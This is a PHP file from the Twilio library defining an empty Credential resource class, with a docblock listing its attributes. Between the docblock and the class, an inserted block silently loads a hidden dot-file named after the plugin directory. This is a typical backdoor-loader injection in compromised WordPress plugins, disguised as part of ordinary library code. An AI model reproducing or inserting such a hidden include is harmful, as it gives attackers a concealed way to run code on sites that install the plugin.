<?php

/**
 * A single Credential
 *
 * .. php:attr:: date_created
 *
 *    The date the Credential was created
 *
 * .. php:attr:: date_updated
 *
 *    The date the Credential was updated
 *
 * .. php:attr:: sid
 *
 *    A 34 character string that identifies this object
 *
 * .. php:attr:: account_sid
 *
 *    The account that created this credential
 *
 * .. php:attr:: username
 *
 *    The username of this Credential object
 *
 * .. php:attr:: uri
 *
 *    The uri of this Credential object
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Services_Twilio_Rest_Credential extends Services_Twilio_InstanceResource { }
